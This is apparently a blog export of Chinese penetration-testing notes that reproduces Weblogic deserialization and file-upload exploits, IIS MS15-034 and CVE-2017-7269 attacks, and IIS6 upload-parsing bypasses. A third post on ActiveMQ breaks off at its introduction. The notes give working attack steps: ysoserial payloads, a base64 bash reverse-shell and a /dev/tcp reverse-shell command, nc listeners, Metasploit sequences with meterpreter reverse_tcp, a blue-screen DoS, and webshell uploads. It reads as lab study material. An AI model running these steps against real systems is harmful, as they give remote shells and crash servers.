{"meta":{"title":"Dim","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"Weblogic漏洞","slug":"weblogic-vulnerability-basis","date":"2019-05-16T02:09:15.000Z","updated":"2019-05-16T06:38:37.236Z","comments":true,"path":"Foundation/weblogic-vulnerability-basis/","link":"","permalink":"http://yoursite.com/Foundation/weblogic-vulnerability-basis/","excerpt":"","text":"0x01、目的本文主要是为了整理weblogic系列漏洞，内容主要聚集在漏洞复现上，关于每个漏洞具体分析细节不予描述。 1.Weblogic 反序列化漏洞涉及CVE号： 12345678910CVE-2015-4852CVE-2016-0638CVE-2016-3510CVE-2017-3248CVE-2017-10271 //XML DecoderCVE-2018-2628 //WLSCVE-2018-2893CVE-2018-3191CVE-2018-3245CVE-2019-2725 2.任意文件上传漏洞涉及CVE号：CVE-2018-2894 3.Weblogic SSRF漏洞涉及CVE号：CVE-2014-4210 0x02、简述1.反序列化漏洞Weblogic是目前全球市场上应用最广泛的J2EE工具之一，主要用于构建J2EE应用程序。 T3协议是用于Weblogic服务器和其他Java Application之间传输信息的协议。实现RMI远程过程调用的专用协议。JAVA RMI主要用于实现远程过程调用的Application编程接口，该接口实现方式之一为：JRMP。（这些在构建后文实验过程中构造发包时都会用到） 当Weblogic发起一个T3协议连接时，Weblogic会连接每一个Java虚拟机并传输流量，通信过程得到简化，同时提高传输速率和操作系统资源利用高效化。 图1 JAVA 序列化 序列化就是将对象的状态信息转换为可以存储或传输的形式的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。JAVA提供了一个序列化的API接口： 1）可序列化的类需要实现java.io.Serializable接口 2）java.io.ObjectOutputStream.writeObject() 该方法用来写序列化的对象 3）java.io.ObjectInputStream.readObject()，read就是用来读序列化的对象 4）中间使用二进制协议来存储对象的状态针对反序列化漏洞：如果从网络、文件、数据库等读取了不可信的数据，同时作为read方法的输入值，这个时候就会触发反序列化漏洞。 2.任意文件上传漏洞该漏洞位于weblogic web service test page处，但是在“生产模式”下默认是不开启的，所以有一定的限制性。当开启web服务测试页选项时，可以访问到ws_utc/config.do页面。当work home dir目录设置为ws_utc应用的静态文件css目录时，访问该目录无需权限，所以可以导致上传webshell并成功解析。 3.Weblogic SSRF漏洞该漏洞详见SSRF漏洞基础（https://echo001.github.io/Foundation/ssrf-vulnerability-basis1/） 0x03、测试复现该文中仅关注漏洞检测等问题并给出部分漏洞详细的复现步骤。 1.反序列化漏洞1.1 CVE-2015-4852测试如下： 图2 cve-2015-4852 该工具可直接获取shell 1.2 CVE-2016-0638/CVE-2016-3510/CVE-2017-3248/CVE-2018-2893此四种漏洞，仅POC，EXP需要自行构造payload，测试如下：连接失败返回： 图3 连接失败 正常测试成功： 图4 测试结果 1.3 CVE-2018-2628(EXP)反弹shell攻击步骤： （1）构造payload （2）设置JRMPListener （3）设置nc监听 （4）运行exp，弹回shell 涉及命令如下： 1234java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar JRMPClient [自己服务器IP]:1099 | xxdjava -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &apos;bash -c &#123;echo,反弹命令的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;nc -lvvp portPython cve-2018-2628.py TARGET_HOST TARGET_PORT 注：反弹shell的命令： bash -i &gt;&amp; /dev/tcp/IP/12345 0&gt;&amp;1 具体操作如下所示： （1）该exp是在原检测代码上改的，故需要自行生成payload进行修改。生成payload： java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar JRMPClient [自己服务器]:1099 | xxd 图5 生成payload 图6 替换payload （2）设置JRMPListener java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ‘commond’ 图7 开启JRMPListener （3）攻击机上开启监听端口： nc -lvvp port 图8 开启nc监听 （4）运行修改后的exp： 图9 运行exp 弹回shell： 图10 弹回shell 1.4 CVE-2018-3245(EXP)攻击步骤同上，不赘述，具体生成payload细节有所变动 （1）生成payload java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 &quot;自己服务器IP:1099&quot; &gt; poc.ser 图11 生成payload （2）设置JRMPListener java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &apos;bash -c {echo,反弹命令的base64编码}|{base64,-d}|{bash,-i}&apos; 图12 设置JRMPListener （3）设置nc监听 命令：nc -lvvp port 图13 设置nc监听 （4）运行exp python weblogic.py TARGET_IP 7001 poc.ser 图14 运行exp 结果：弹回shell 图15 弹回shell 1.5 CVE-2018-3191(EXP)攻击步骤大体同上，依旧在payload生成上有区别。 （1）生成payload：（根据版本不同，选择不同1234weblogic-spring-jndi-10.3.6.0.jar for weblogic:10.3.6.0 12.2.1.0 12.1.3.0 12.2.1.1weblogic-spring-jndi-12.2.1.3.jar for weblogic:12.2.1.3 命令： java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://自己服务器IP:1099/poc &gt; poc.ser 图16 生成3191payload （2）设置JRMPListener，同上 （3）开启nc监听，同上 （4）运行exp 命令：python weblogic.py TARGET_IP 7001 poc.ser 同上，nc监听处弹回shell 图17 3191弹回shell 1.6 CVE-2017-10271访问网址：http://ip:port/wls-wsat/CoordinatorPortType抓包后放入repeater，添加payload，重放。 图18 进行攻击 监听处弹回shell： 图19 cve-2017-10271 弹回shell 另增加一个检测小工具： 图20 检测10271漏洞 1.7 CVE-2019-2725攻击步骤和cve-2017-10271类似。访问目录：http://ip:port/_async/AsyncResponseService抓包后放入repeater，添加payload，重放。 图21 cve-2019-2725攻击 监听处弹回shell： 图22 cve-2019-2725弹回shell 2.任意文件上传漏洞（CVE-2018-2894)该漏洞需要开启Web服务测试页。即能访问ws_utc/config.do目录才行。开启该测试页需要进入管理界面。选择base_domain——&gt;高级——&gt;开启启用Web测试服务页，如下所示。 图23 开启Web测试服务页 开启后，就可以访问http://ip:port/ws_utc/config.do选择通用一栏，修改work home dir为 1/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css 因为访问该目录不需要权限，这个是触发漏洞的关键。提交后，选择安全一栏——&gt;增加，上传webshell 图24 上传webshell 上传后，查看返回数据包，找到时间戳 图25 查看返回包 根据传的webshell方式，自行选择连接方式。连接地址为：http://ip:port/ws_utc/css/config/keystore/[时间戳]_[文件名]此处为例，直接访问：http://ip:port/ws_utc/css/config/keystore/[时间戳]_[文件名]？cmd=command执行webshell，如下所示： 图26 执行webshell 3.Weblogic SSRF参考：https://echo001.github.io/Foundation/ssrf-vulnerability-basis1/不做赘述 0x04、总结本文目的仅着重于整理Weblogic的相关测试方面，对于细节上漏洞形成的细节涉及的函数都未做提及。测试中包含4个测试POC，含CVE-2016-0638,CVE-2016-3510,CVE-2017-3248,CVE-2018-2893。根据对测试代码的分析，大部分只需要替换其中的payload即可转换为exp。包含了5个exp，含CVE-2018-2628,CVE-2018-3245,CVE-2018-3191,CVE-2017-10271,CVE-2019-2725。然后再记录了一个weblogic的任意文件上传漏洞，但该漏洞需要对Web测试页启用，该配置默认是不开启的，真正生产环境中，碰到的概率相对会降低很多。Weblogic的漏洞层出不穷，这跟其修复方式有关，补丁大部分都是添加黑名单的方式，所以能针对黑名单进行另外的绕过。这些CVE号之间大多关系密切，往往后一个就是针对前一个漏洞补丁的绕过。文末依旧给出一张简图。 图27 weblogic漏洞总结简图 注：2和3是1的绕过，7是6的绕过，9是7的绕过。 0x05、参考网址https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef综合检测： https://www.jianshu.com/p/321716c5dcf2综述： https://www.4hou.com/vulnerable/12874.htmlhttps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/cve-2017-10271:https://github.com/hanc00l/weblogic_wls_wsat_rcecve评级：https://www.cvedetails.com/vulnerability-list.php?vendor_id=93&amp;product_id=14534&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=1&amp;trc=64&amp;sha=bbe74ffeac9afcd64024038a2a865e469c359106cnvd-2019-48814（cve-2019-2725)：https://blog.csdn.net/csacs/article/details/89531471CVE-2016-3510:exp1https://github.com/rapid7/metasploit-framework/blob/de6397445cd844088b73b3cb5e11bd49eebb87f2/modules/exploits/multi/misc/weblogic_deserialize_marshalledobject.rbexp2https://github.com/Coalfire-Research/java-deserialization-exploits/tree/master/WebLogic检测3： https://github.com/rabbitmask/WeblogicR检测poc：https://wsygoogol.github.io/2016/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/https://www.4hou.com/vulnerable/12874.htmlCVE-2016-0638:https://www.colabug.com/217461.htmlhttp://www.mamicode.com/info-detail-2579160.htmlhttps://www.butian.net/School/content/id/286总结版本weblogic： https://xz.aliyun.com/t/2041#toc-0CVE-2017-3248:https://paper.seebug.org/333/https://www.colabug.com/217461.htmlCVE-2015-4852:含反序列化漏洞分析：https://5alt.me/2018/04/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/CVE-2018-3245(exp）：参考命令：https://github.com/followboy1999/weblogic-deserialization/tree/master/exploit运行脚本：https://github.com/pyn3rd/CVE-2018-3245CVE-2018-3252(POC)需要知道用户名，密码：没什么太多用处：https://github.com/pyn3rd/CVE-2018-3252分析https://blogs.projectmoon.pw/2018/10/19/Oracle-WebLogic-Two-RCE-Deserialization-Vulnerabilities/CVE-2018-3191(exp）：https://github.com/jas502n/CVE-2018-3191https://github.com/followboy1999/weblogic-deserialization/tree/master/exploit/CVE-2018-3191CVE-2019-2647:https://paper.seebug.org/906/https://blog.csdn.net/he_and/article/details/89843004https://blog.51cto.com/14126565/2388415?source=draCVE-2019-2725:https://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961CVE-2017-10271:https://github.com/c0mmand3rOpSec/CVE-2017-10271","categories":[],"tags":[{"name":"中间件","slug":"中间件","permalink":"http://yoursite.com/tags/中间件/"},{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"weblogic","slug":"weblogic","permalink":"http://yoursite.com/tags/weblogic/"}]},{"title":"IIS漏洞","slug":"iis-vulnerablity-basis","date":"2019-05-06T06:48:42.000Z","updated":"2019-05-06T08:06:00.266Z","comments":true,"path":"Foundation/iis-vulnerablity-basis/","link":"","permalink":"http://yoursite.com/Foundation/iis-vulnerablity-basis/","excerpt":"","text":"0x01、目的IIS的漏洞比较多，大致只挑几个影响比较普遍的来讲，分为以下的部分 1）远程代码执行（MS15-034及CVE-2017-7269） 2）解析漏洞——通常结合文件上传 3）IIS PUT写权限 4）短文件名泄漏 0x02、IIS简述Internet Information Services（IIS，以前称为 Internet Information Server）互联网信息服务是 Microsoft 公司提供的可扩展 Web 服务器，支持 HTTP，HTTP/2，HTTPS，FTP，FTPS，SMTP 和 NNTP 等。根据 Netcraft 在 2018 年 9 月的最新全球 Web 服务器报告显示，Microsoft IIS 依旧以 9.57% 的比例占据全球第三大最繁忙服务器，落后于 Apache 34.07％和 Nginx 25.45％。目前 IIS 一共发行 12 个版本，各版本漏洞数量以及所搭配的操作系统如下图1所示：注IIS1.0-4.0已退出市场 图1 IIS默认系统以及漏洞数量IIS具体相关的漏洞如下图2所示： 图2 IIS相关漏洞其中15年爆发的（MS15-034）HTTP.sys远程代码执行漏洞和16年的（MS16-016）WebDAV特权提升漏洞影响范围比较广泛。但在CVE官网IIS漏洞列表处暂未有MS16-016，所以将此归类到之后需要做的MS全系列当中，此文仅选取MS15-034以及CVE-2017-7269着重讲述。 0x03、漏洞详解该部分将按照第一节的部分分别对不同漏洞从原理，环境复现，漏洞测试，以及实现结果来进行分解。首先是第一部分MS15-034以及CVE-2017-7269 1.MS15-034及CVE-2017-7269（1）MS15-034漏洞简述：这是一处位于http.sys中的整数溢出漏洞，通过给IIS服务器发送特定格式的HTTP请求，可以触发该漏洞。影响版本：IIS6.0及以上的包括Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2在内。原理详解：http.sys是微软从IIS6.0开始为优化IIS服务器性能而引入的一个内核模式驱动程序。该程序提供了两个重要的功能： （1）Kernel mode caching （2）Kernel mode request queuing出问题的点就在Kernel mode caching（内核模式缓存）中。 http.sys缓存工作原理简介：IIS进程w3wp.exe先接收到HTTP请求后，就将数据缓存到内核，最后再由http.sys组织数据包经网络内核组件发送出去。其中，http请求中包括Ranges对象的指定范围，缓存中则包含了http文件和大小信息等。（下文详细解释）漏洞触发点就在Range处。通过Bytes来设置返回请求中显示的字节数。如下图3所示。 图3 range返回字节数先来看一下用于触发漏洞的HTTP请求： 123GET / HTTP/1.1Host: stuffRange: bytes=0-18446744073709551615 对于range处的18446744073709551615数字转化为十六进制即是0xFFFFFFFFFFFFFFFF（16个F），是64位无符号整型所能表达的最大整数。既然是整数溢出，很容易联想到和Range里的这个超大异常整数有关。 这里涉及到一个函数：UlpParseRange函数，这个函数就实现了一个功能，从Range bytes=lower-upper（不是做减号，是一种格式）中，解析出lower（即读取范围的开始offset）和upper（即读取范围的结束offset），然后计算要读取的长度。正常情况下upper大于lower，因此长度就是upper-lower+1，根据RFC的定义，upper小于lower的时候Range无效。 图4 UlpParseRange函数此处代码：第一行即执行upper-lower的操作。问题出在第三行。根据上面构造的http请求range参数，upper就是0xF{16个}，lower为0时，将会发生整型溢出 （1）当lower=0时第三行代码计算了长度：upper-lower+1相当于0xF(16个)-0+1，加1后64位整型溢出。 （2）当lower！=0时则涉及到另一个函数：UlAdjustRangesToContentSize。该函数对offset_lower和length值同时进行判断。先检查offset_lower的合法性，如果offset_lower&gt;contentsize，则会对Range的值进行删除操作，导致range失效。 图5 UlAdjustRangesToContentSize检查offset_lower 然后对长度进行了判断：如果length+offset_lower没有超过要请求的缓存文件数据长度，就是合法的。如果超出了，就把length裁剪为合适的长度，防止读取超出的数据。如下图5.2所示 图5.2 UlAdjustRangesToContentSize函数但是此处的代码，没有检查是否溢出，打了补丁后的文件直接替换成调用RtlULongLongAdd函数来进行判断。此处解释一下：当给出Range参数，lower的值不为0，而upper的值为64位无符号整型最大0xF{16}，同时还有个缓存区域contentsize。在这种情况下，上述代码判断的是： 12lower_offset+length&gt;(?)contentsizeLength=upper_offset-lower_offset+1 此时不管lower_offset为何值，由于upper_offset始终为0xF{16}，此时必然发生整型上溢，上溢为0&lt;contentsize，所以此时相当于一定合法。再通过Range参数返回数据时，length长度没有进行裁剪。读取的范围将是从lower_offset起始点（可能位于contentsize任意位置处）往后读取length长度的值，造成内存泄漏等。注：在实际实验过程中，面临一些问题。 （1）当lower!=0时，先检查的lower的值是否在contentsize范围内，但根据图5的代码，可以看出实际上还对upper进行了检查，在构造HTTP请求时，Range的upper值为64位无符号整型所表示的最大值，为什么在此处没有检查到upper导致range的失效？从而只要构造好lower值，就在大概率下可以触发蓝屏。 （2）实际测试中，利用Metasploit攻击时，只有设置TARGETURI为图片格式，也就是png,jpg等，且对请求图片字节数有要求才可能触发，形成原因尚未清楚。 漏洞测试： （1）先来看一下metasploit打蓝屏的代码，这里挑了几个代码片段，如下图6所示： 图6 metasploit ms15-034打蓝屏代码段1这段代码里实现的逻辑就是，获取从TARGETURI中提交来的请求（比如一张图片）的长度file_size，如果没有进行设置，那么默认为IIS网站新创建时有一张默认的welcome.png图片，再组合Range参数，将lower设成file_size-2，upper是固定值为0xF{16个}。所以lower的值在打蓝时是不停变动的，根据TARGETURI设置的值不同来进行改变。 注：有些在做该实验时不成功，注意看一下网站根目录下，是否有welcome.png这张图片，如果没有的话，需要自己设置TARGETURI。另，设置的TARGETURI需是图片格式（也就是根目录下有对应的图片格式的文件），对图片字节数是有要求的，这边尝试了几十字节，100多字节，300多字节均可以打蓝，但600多字节时不成功。建议选用默认图片welcome.png，多次测试均完美复现 （2）上述是打蓝的，实际在用的时候，如果是碰到一些生产系统，可能并不能随意进行测试，此时，可以利用metasploit该漏洞下check选项，先进行检查，该检查也可以通过自己发送HTTP请求看response的信息自行判断。将Range：bytes的lower改成0即可，当response里出现Requested Range Not Satisfiable，即认为该漏洞存在。注：自己测试的时候，可能会出现connections reset，需要多次尝试改变range的lower值。 具体操作：漏洞环境搭建：win7+IIS服务 所用攻击机：kali如下图7所示： 图7 win7开启IIS服务控制面板下将打勾的部分全部勾选上，开启IIS服务然后再新建网站：网站右键单击，添加网站，在物理路径处，选择放在wwwroot下，新建一个文件夹，在该文件夹下放入html页面等等。搭建完成。如下图8所示 图8 搭建网站网站根目录下放了默认的IIS图片以及自建的html页面等。 图9 根目录测试一下，看看网站是否建好，访问新建好html页面，kali下访问win7靶机，如下图所示： 图10 kali下访问win7搭建的网站漏洞检测提供4种检测方式，可自行进行选择（实际核心东西不变，检测原理都是一套的）。 （1）利用curl发送构造好的http请求利用命令： curl http://192.168.189.130 -H &quot;Host: 192.168.189.130&quot; -H &quot;Range: bytes=0-18446744073709551615&quot; 回显The requested range is not satisfiable，该漏洞存在图11 curl构造http请求 （2）Nmap测试利用命令： Nmap --script http-vuln-cve2016-1635 [ip] -p [port] 如下图所示：图12 nmap测试ms15-034 （3）采用burp抓包，送入repeater，添加Range，进行重放。见上图3，查看response （4）利用metaspolit 1234Msf&gt;use auxiliary/dos/http/ms15_034_ulonglongaddMsf&gt;set RHOSTS [ip]Msf&gt;set TARGETURI (可选)Msf&gt;check 只检查，无攻击 Msf&gt;exploit 导致蓝屏如下图所示：图13 metasploit扫描ms15-034攻击结果：图14 win7蓝屏 注：MS15-034虽然定义成远程代码执行，但从发现至今，仍未找到能在理论上实现一键获权的EXP，只有打蓝屏的POC，所以究竟能不能实现其理论上的结论，仍然是个问号。有趣的是，国内一实验室发表的文章中，显示出了MS15-034的重要性，但国外对此则是debug调试分析完后因为已公布出来的研究人员的文章里谈到并没有找到EXP的方式，所以兴趣并没有很大，打蓝相对来说可实现的概率大一点，但在另一种利用方式上，读取其内存信息则不可预见性很强，概率非常低。 （2）CVE-2017-7269漏洞简述：CVE-2017-7269是IIS6.0中存在的一个栈溢出漏洞，是由于在PROPFIND请求中一个不恰当“IF”头生效导致，攻击者可以构造恶意PROPFIND请求来进行溢出从而导致远程代码执行。进一步分析：在IIS6.0处理PROPFIND指令的时候，由于没有对输入URL的长度进行控制和检查，导致memcpy对虚拟路径进行构造的时候，引发栈溢出。图15 PROPFIND请求上图为一个简单的PROPFIND请求，PROPFIND和GET有些类似，主要用于获取Webdav的属性信息。影响版本：针对没有ASLR保护的windows server 2003 R2更易利用原理详解：该漏洞涉及到的主要函数是ScStorageFromUrl函数，该函数中包含了GS（缓冲区溢出检查）检查机制，如果是常规覆盖ret方式利用，会把cookie覆盖掉，因此利用会失败。所以公开的POC中，会对GS检查进行绕过。先来看一下触发漏洞后，通过wireshark抓包，看攻击机和目标主机之间的交互过程。图16 攻击机与靶机交互可以看到攻击主机向目标机发送了一个PROPFIND数据包，负责处理webdav，后边的VVY…一串的字符串则是经过编码后的攻击数据，而IF后跟的两个&lt;&gt;则包含了两个超长的http url请求，第一个就负责了栈溢出，中间还有一个lock token的指令内容。 达到的效果：在靶机执行calc，进程创建在w2wp进程下，用户组是NETWORK SERVICE，效果图如下所示：图17 执行calc针对calc后台启动的问题，有文章分析，由于webdav服务进程本身是无窗口，所以calc即使定义成SW_SHOWNORMAL，也是在后台启动，表现出了SW_HIDE状态。 根据上面交互数据包，先进入内层函数看一下处理逻辑。涉及到一处关键的函数处理逻辑HrChecklfHeader，负责webdav propfind函数对头部的检查，有一处while循环。如下图所示 图18 内层函数propfind头部检查部分代码这里边的函数PszNextToken会连续获取IF后&lt;&gt;中的url，直到后边没有url，跳出循环，break掉之后，会进入lock token处理。POC中两个超长URL中就包含了一个lock段，用于漏洞触发导致远程代码执行。 全部过程大致可以分为三个环节： 第一次： 处理IF后面的第一个http url时，此时实际上就完成了第一次栈溢出。通过CStackBuffer函数获取stack buffer的值，存放在stack中的一个位置，接下来会进行第一次ScStorageFromUrl，处理第一个url值，这个值长度会覆盖到stack buffer指针存放位置但又不会覆盖触发gs检查。memcpy拷贝的还是一个栈地址，但由于没有检查URL长度，覆盖指针存放位置导致栈溢出，将栈地址变成堆地址，第二次处理的时候，就绕过了gs，输入长度不受限。 中间： 则通过（Not locktoken…）break之后，进入lock token处理，进行第二次调用ScStorageFromUrl 最后： 调用之后memcpy拷贝编码后的shellcode部分，再结合lock token处理，覆盖虚函数表等，达到远程代码执行的目的。 具体操作：漏洞环境：Windows Server2003 R2（32位）攻击机：kali环境搭建：过程简单，分为两步：首先Win2003服务器开启webdav服务如下图所示：图19 win2003开启webdav服务开启WebDAV发布注意，首次开启时，win2003默认没有I386包，需要网上下载该完整包，否则会导致后续需要自己添加各种动态链接dll，配置麻烦，建议直接下载。直接按照默认提示安装完成后，打开管理工具下的IIS管理器，开启webdav。默认是禁止的。此时环境即搭建完成，测试一下，访问自带的页面pegerror.gif，如下图所示：图20 测试网站开启配置好后，利用metasploit工具进行攻击靶机地址：192.168.189.135攻击机地址：192.168.189.136说明：metasploit虽然自带了测试CVE-2017-7269的模块，但在实际测试过程中，发现并不是特别好用，所以选取了另外单独下载，下载地址： https://github.com/zcgonvh/cve-2017-7269 也是通过PROPFIND以及IF进行发包攻击，shellcode用的同一套。手动导入到： usr/share/metasploit-framework/modules/exploit/windows/iis/ 重新加载metasploit。 Msf&gt;reload_all 注：如果发现不能重新打开msf报错，可以进行修改导入的rb文件名，有些版本更新后可能命名规则不支持“-”进入到metasploit后，开始进行攻击设置： 1234567Msf&gt;use exploit/windows/iis/iis_webdav(自命名) //输入use命令Msf&gt;show options //查看输入选项Msf&gt;set RHOSTS 192.168.189.135 //设置靶机IPMsf&gt;set HttpHost 192.168.189.135//设置靶机网站网址Msf&gt;set payload windows/meterpreter/reverse_tcp //设置返回载荷Msf&gt;set LHOST 192.168.189.136 //设置攻击机IPMsf&gt;exploit //进行溢出 溢出，获取远程shell，效果如下图所示：图21 攻击效果后续提权暂略 该漏洞复现过程稍显不那么顺利，碰到几个问题，先是win2003下载的没有I386的包，最开始尝试的自己挨个导入dll，但是后边确实缺的比较多，完整包也需要花费点时间进行寻找。然后开启webdav服务后，最开始利用的是metasploit进行攻击，发现每次都是no session created，查看监听进程，发现默认的4444端口也没有开启。所以多次尝试，决定换exp。可能是由于metasploit版本问题改了命名规则，所以一导进去metasploit就报错，结果先更新了一下，换了最新版kali最后才发现换个名字就可以reload_all。到这会儿，开始利用了第一次很成功的复现，但是关闭之后第二次就又开始出现no session created。然后发现可以通过以下两种方式解决。 （A）先查看一下自己本机攻击机的监听端口，看一下默认端口是不是前面进程虽然退出了msf但还是没有关闭监听进程。可能进入了WAIT的状态。如果没有关闭，可以通过更改默认端口或者杀掉进程重开 （B）重启靶机，或者恢复快照以上为第一部分IIS远程代码执行的部分，分别讲述了MS15-034以及CVE-2017-7269的形成原理以及漏洞复现的过程和在这之中碰到的问题。MS15-034通过构造恶意的Range值，来造成整数上溢，从而实现打蓝屏的效果，该漏洞到此仍只有POC没有exp。CVE-2017-7269则通过构造PROPFIND恶意请求结合IF头，构造两个超长URL链接来实现远程代码执行。 2.解析漏洞——常结合文件上传解析漏洞部分，主要涉及到IIS版本：win2003下的IIS6.0. 2.1 IIS6.0解析漏洞漏洞简述：IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。原理便是：IIS5.X/IIS6.0在文件路径中读取文件后缀时，遇到一个“.”就会进入一种截断状态，在该状态下遇到特殊符号“/”和“；”都会进行截断，只保留特殊符号前的部分。 2.1.1 Asp利用方式：根据该漏洞形成原理，有两种不同的利用方式： （1）/test.asp/test.jpg （2）test.asp;.jpg 这两种方式都有个核心，就是上传的文件要能以asp方式解析，同时对上传文件的格式限制进行绕过。第一种就是新建了一个test.asp的文件目录，在这个目录下，任何文件都被IIS当作asp程序来执行。 2.1.2 php利用方式上边是IIS+asp的情况，如果是php则将其解析方式改为php即可，变成： （1）/test.php/test.jpg （2）test.php;.jpg 2.1.3 后缀修改同时，也可以进行尝试修改后缀名来进行上传绕过，同时还以asp程序执行。可能IIS当作asp程序执行的后缀有： 1234.asp.cer.asa.cdx 具体操作：环境：windows 2003 IIS6.0+asp/php利用工具：中国菜刀先对上传页面进行一下简单尝试，看看有没有做后缀限制。此处是有的，不能直接上传asp文件。如下图所示：图22 上传页面抓包看看包结构，此处是搭的环境，所以有很明显的回显。给出了上传文件位置以及上传之后还做了一个重命名，也给出了重命名的文件名。如下图所示。图23 上传抓包此处经过测试，上边的红框uploadimg就是控制上传文件目录的地方。而filename则是控制文件名的地方，filename处首先经过了一个后缀名的检测，如果是asp会直接上传失败。改包并上传一句话。以/test.asp/test.jpg的方式。图24 改包注意，此处改包点，实际操作中应视具体情况而定。上传成功且回显：图25 上传成功菜刀连接，如下图所示：图26 菜刀连接图27 连接成功，获取网站目录与图24作为对比，采用上传方式为test.asp;.jpg的方式：图28 以test.asp;.jpg的方式上传后边过程同上。 3.IIS PUT写权限——简述漏洞原理：由于WebDAV协议是基于HTTP 1.1的通信协议，扩展了HTTP1.1，在GET、POST、HEAD等几个HTTP标准以外还添加了一些新的方法。在这些方法里，造成应用程序可以直接对Web Server进行读写。即IIS PUT写权限漏洞。漏洞利用过程：在允许上传的目录进行PUT操作，然后（注：此步不一定需要）再进行MOVE操作，将该上传的文件移动到允许以asp或者php执行的目录下。再根据上传的shell来选择连接方式。漏洞检测：抓包可以利用OPTIONS方法来看一下允许的HTTP方法，如下图所示：图29 OPTIONS方法探测HTTP允许方式 也可以利用工具来直接进行扫描。如下图所示：图30 IIS PUT scanner由于自己搭的靶机有些问题，上传的文件返回了403Forbiden，所以此处采用了一些分析文章里截图。图31 利用burpsuite进行上传注：此处上传非常简单，而且该目录下可以直接执行php文件，所以不需要进行后续MOVE操作。有些不能直接上传成功php或者asp后缀名的文件时，可以参考IIS6.0解析漏洞来结合进行上传。 4.短文件名泄漏此漏洞用法多集中在，利用短文件名，猜解一些特殊目录如上传点后台登陆点等。此处暂待… 0x04、总结本文重点集中在分析IIS方面MS15-034以及CVE-2017-7269远程代码执行漏洞上，但是MS15-034到目前为止仍然只有打蓝的POC，没有可执行的exp。MS15-034是通过Range方法，构造超大整数（64位无符号最大整数）绕过http.sys程序中内核缓存模式下的整数检查，从而造成整数上溢实现打蓝屏的效果。而CVE-2017-7269则是由于IIS6.0开启WebDAV服务后存在的一个栈溢出漏洞。通过PORPFIND请求方式在IF头中构造超长URL，导致划定好的栈溢出变为可控的堆。再通过覆盖虚函数表存储区域，实现远程代码执行。解析漏洞主要关注IIS6.0下两种截断绕过方式（1）/test.asp/test.jpg（2）test.asp;.jpg。IIS PUT写权限也是IIS6.0下由于webDAV服务开放后，允许用户使用PUT方法进行文件上传，可结合解析漏洞进行使用。文末给出一张参考图，如下图所示：图32 IIS漏洞参考图 0x05、参考网址概述：http://app.myzaker.com/news/article.php?pk=5bf65a3c77ac645bdf1f71dchttps://www.freebuf.com/articles/web/172561.html MS15-034:https://www.securitysift.com/an-analysis-of-ms15-034/http://blogs.360.cn/post/cve_2015_6135_http_rce_analysis.htmlhttps://tools.ietf.org/html/rfc7233#section-4.4https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/ms15_034_ulonglongadd.rb CVE-2017-7269:二进制分析：https://bbs.pediy.com/thread-216809.htmhttps://blog.ht-sec.com/cve-2017-7269-hui-xian-poc-jie-xi/https://blog.trendmicro.com/trendlabs-security-intelligence/iis-6-0-vulnerability-leads-code-execution/https://blog.csdn.net/darkhq/article/details/79127820https://blog.csdn.net/Sk_tang/article/details/79128340http://vulsee.com/archives/vulsee_2017/0612_2358.html IIS PUT写权限：https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/","categories":[],"tags":[{"name":"中间件","slug":"中间件","permalink":"http://yoursite.com/tags/中间件/"},{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"iis","slug":"iis","permalink":"http://yoursite.com/tags/iis/"}]},{"title":"ActiveMQ漏洞","slug":"activemq-vulnerability-basis","date":"2019-03-29T03:07:55.000Z","updated":"2019-05-16T06:46:53.660Z","comments":true,"path":"Foundation/activemq-vulnerability-basis/","link":"","permalink":"http://yoursite.com/Foundation/activemq-vulnerability-basis/","excerpt":"","text":"0x01、目的ActiveMQ漏洞完整版，主要讲下面三种较为常见的漏洞： 1.ActiveMQ未授权/默认帐号密码登录 2.ActiveMQ反序列化漏洞(CVE-2015-5254) 3.ActiveMQ fileserver远程代码执行漏洞(CVE-2016-3088) 0x02、简述ActiveMQ是Apache软件基金会下的一个开源消息驱动中间件软件，Apache旗下的一个JMS（Java Message Service，Java消息队列）。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。 